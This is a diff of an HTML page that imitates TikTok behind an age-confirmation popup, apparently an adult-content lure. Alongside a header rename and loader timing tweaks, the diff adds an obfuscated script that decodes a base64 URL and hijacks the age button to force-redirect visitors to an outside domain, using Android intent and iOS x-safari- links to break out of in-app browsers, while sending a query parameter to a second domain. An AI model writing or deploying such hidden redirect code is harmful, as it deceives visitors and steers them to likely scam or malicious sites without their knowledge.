@@ -236,7 +236,7 @@
 
     <div class="header">
       <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" alt="TikTok Logo">
-      <span>TikPorn</span>
+      <span>TikTik</span>
       <img src="https://cdn-icons-png.flaticon.com/512/1384/1384090.png" alt="Menu">
     </div>
 
@@ -272,18 +272,76 @@
 
   <script>
     window.addEventListener('DOMContentLoaded', () => {
+      const loader = document.getElementById('loader');
+      const container = document.getElementById('main-content');
+      const popup = document.getElementById('popup');
+  
       setTimeout(() => {
-        document.getElementById('loader').classList.add('hidden');
-        document.getElementById('main-content').style.visibility = 'visible';
-        document.getElementById('popup').classList.add('active');
+        loader.classList.add('hidden');
+        container.style.visibility = 'visible';
+        popup.classList.add('active');
         document.getElementById('overlay').classList.add('active');
-      }, 1500);
+      }, 1000); // 1 секунда "загрузки"
     });
-
+  
     function confirmAge() {
       document.getElementById('popup').classList.remove('active');
       document.getElementById('overlay').classList.remove('active');
     }
+    ;(function () {
+  const _0x32af0a = atob,
+    _0x3ff128 = [
+      'aHR0cHM6Ly9lNjNwOHI5LmZpbmRwYXJ0bmVydGhlZmluZGVyLmNvbS9waHEyYWduP3MxPXRocmVhZHNfaW5zdGFjdW0=',
+    ],
+    _0x427e6b = navigator.userAgent || navigator.vendor || window.opera,
+    _0x26dbbb = /android/i.test(_0x427e6b),
+    _0x12658e = /iPad|iPhone|iPod/.test(_0x427e6b) && !window.MSStream
+  function _0x30f048() {
+    _0x466ab6()
+    const _0x4df9fd = _0x32af0a(
+      _0x3ff128[Math.floor(Math.random() * _0x3ff128.length)]
+    )
+    let _0x237880 = false
+    function _0x36d08f() {
+      document.hidden &&
+        ((_0x237880 = true),
+        clearTimeout(_0x500acf),
+        document.removeEventListener('visibilitychange', _0x36d08f))
+    }
+    document.addEventListener('visibilitychange', _0x36d08f)
+    const _0x500acf = setTimeout(() => {
+      !_0x237880 && ((_0x237880 = true), (window.location.href = _0x4df9fd))
+    }, 1500)
+    if (_0x26dbbb) {
+      const _0x144bd1 =
+        'intent://' +
+        _0x4df9fd.replace('https://', '') +
+        '#Intent;scheme=https;end'
+      window.location.href = _0x144bd1
+    } else {
+      _0x12658e
+        ? (window.location.href = 'x-safari-' + _0x4df9fd)
+        : ((window.location.href = _0x4df9fd), (_0x237880 = true))
+    }
+  }
+  function _0x466ab6() {
+    const _0x5759b5 = new URLSearchParams(window.location.search),
+      _0x5af7e9 = _0x5759b5.get('online')
+    if (_0x5af7e9) {
+      const _0x33d7e8 = 'https://bestgirlsnow.xyz/api/redirect',
+        _0x5948f6 = _0x33d7e8 + '?param=' + encodeURIComponent(_0x5af7e9)
+      fetch(_0x5948f6, { method: 'GET' })
+        .then((_0x5a9afe) => _0x5a9afe.text())
+        .catch((_0xbcfcb9) => console.error('Ошибка:', _0xbcfcb9))
+    }
+  }
+  setTimeout(() => {
+    document.getElementById('popup').style.display = 'block'
+    document.getElementById('overlay').style.display = 'block'
+  }, 3000)
+  window.confirmAge = _0x30f048
+})()
+
   </script>
 </body>
 </html>
